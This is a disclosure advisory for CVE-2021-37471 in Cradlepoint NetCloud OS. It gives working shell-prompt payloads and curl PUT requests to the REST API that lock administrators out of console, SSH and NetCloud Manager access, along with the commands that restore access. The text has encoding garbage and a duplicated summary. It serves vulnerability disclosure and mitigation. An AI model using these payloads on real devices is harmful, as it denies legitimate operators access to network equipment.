### CVE-2021-37471: Denial of Console Availability Using Restricted Shell Escape Sequences

##### 2021-11-09 00:00:57

#### **SUMMARY:**

An authenticated user on NetCloud OS (NCOS) versions before 7.21.80 can run restricted shell escape sequences that provide the authenticated user the capability to simultaneously deny availability to the device’s NetCloud Manager console, local console and SSH command-line. If your Cradlepoint device is configured for local administration and your NCOS credentials are default or have been compromised, a threat actor could use this vulnerability to perform a denial of service. However, the user is already authenticated as an NCOS admin and could make configuration changes that would result in the same denial of service.

---

**Products Affected:** Cradlepoint endpoints running NCOS versions earlier than 7.21.80

**Recommendations:** Upgrade to the latest NCOS version, change device default passwords, use strong passphrases, prevent unauthorized disclosure of credentials, disable local admin access on all NCOS LANs, and manage Cradlepoint endpoints from NetCloud Manager.

## Description

### [CVE]: [CVE-2021-37471](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37471 "CVE-2021-37471")

Cradlepoint NetCloud OS devices running versions before 7.21.80 are vulnerable to a restricted shell escape sequence that provides an attacker the capability to simultaneously deny availability to the device’s NetCloud Manager console, local console and SSH command-line.

### [Class]: Denial of Service / Denial of Availability

The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor, resulting in denial of service / denial of availability.

### [Attack Type]: Context-dependent

Exploitation methods include:

* Local console
* SSH command-line
* REST API

### [Vendors]: Cradlepoint

The vendor involved in this vulnerability is Cradlepoint.

### [Affected Product Code Base]: Versions before v7.21.80

Affected Hardware

* Devices running NetCloud OS (such as IBR900-600)

Affected Versions

* Versions before v7.21.80

}

```
## Exploitation

Exploitation can be performed 3 ways. Local console, over SSH on the command-line or utilizing the REST API.

### Shell and Local Console

The vulnerability appears to stem from ANSI code that breaks the restricted shell prompt. Additionally, I observed escaping of raw ANSI like `\033[0m` so, you canât use that here and are forced to use the built-ins.

Â  Â  Â
Â  Â  Â

Deny user access with ANSI escaping

```
set /config/shell/prompt "</yellow>"

```
```
set /config/shell/prompt "</red>"

```
```
set /config/shell/prompt "</bold>"

```

Â  Â  Â
Â  Â  Â

Deny user access with str methods

```
set /config/shell/prompt "{id.center}"

```
```
set /config/shell/prompt "{id.index}"

```

Â  Â  Â
Â  Â  Â

Denial results in

```
Connection to IP_ADDRESS closed by remote host.
Connection to IP_ADDRESS closed.

```

Â  Â  Â
Â  Â  Â

Allow user access

```
set /config/shell/prompt "[{username}@{hostname}: <bold>{cwd}</bold>]$ "

```

Â  Â  Â
Â  Â  Â

Allowing results in

```
Connection to IP_ADDRESS closed by remote host.
Connection to IP_ADDRESS closed.

```

Â  Â  Â
Â  Â  Â

However, now you can log back in.

Â  Â  Â
Â  Â  Â

### How to perform over REST API

Over the REST API, you can craft a PUT method to accomplish user access denial.

Â  Â  Â
Â  Â  Â

Deny user access

```
curl -X PUT -d 'data="[{username}@{hostname}: \\033[1m{cwd}</bold>]$ "' -s -u "username:password" -k https://IP_ADDRESS/api/config/shell/prompt | jq

```
```
{
  "success": true,
  "data": "[{username}@{hostname}: \\033[1m{cwd}</bold>]$ "
}

```

Â  Â  Â
Â  Â  Â

Allow user access

```
curl -X PUT -d 'data="[{username}@{hostname}: <bold>{cwd}</bold>]$ "' -s -u "username:password" -k https://IP_ADDRESS/api/config/shell/prompt | jq

```
```
{
  "success": true,
  "data": "[{username}@{hostname}: <bold>{cwd}</bold>]$ "
}

```

Â  Â  Â
Â  Â  Â

## Mitigations

Mitigations are dependent on a bad actors possession of user credentials or updating to a fixed release. Cradlepoint stated a fix has been confirmed and released.

### CVE-2021-37471: Denial of Console Availability Using Restricted Shell Escape Sequences

##### 2021-11-09 00:00:57

#### **SUMMARY:**

An authenticated user on NetCloud OS (NCOS) versions before 7.21.80 can run restricted shell escape sequences that provide the authenticated user the capability to simultaneously deny availability to the device’s NetCloud Manager console, local console and SSH command-line. If your Cradlepoint device is configured for local administration and your NCOS credentials are default or have been compromised, a threat actor could use this vulnerability to perform a denial of service. However, the user is already authenticated as an NCOS admin and could make configuration changes that would result in the same denial of service.

---

**Products Affected:** Cradlepoint endpoints running NCOS versions earlier than 7.21.80

**Recommendations:** Upgrade to the latest NCOS version, change device default passwords, use strong passphrases, prevent unauthorized disclosure of credentials, disable local admin access on all NCOS LANs, and manage Cradlepoint endpoints from NetCloud Manager.
